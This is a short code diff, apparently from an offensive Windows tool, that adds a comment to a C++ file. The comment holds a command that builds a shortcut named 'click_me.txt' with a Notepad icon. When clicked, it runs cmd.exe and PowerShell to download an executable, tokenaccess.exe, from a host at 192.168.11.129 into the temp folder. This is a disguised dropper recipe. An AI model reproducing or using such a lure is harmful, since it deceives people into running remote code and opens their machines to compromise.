@@ -1,3 +1,7 @@
+/*
+python ./lnk.py click_me.txt "C:\Windows\system32\cmd.exe" -a "/k powershell wget http://192.168.11.129:4343/tokenaccess.exe -OutFile %TMP%\\tokenaccess.exe" -i "C:/windows/system32/notepad.exe"
+*/
+
 #include <windows.h>
 #include <stdio.h>
 #include <iostream>
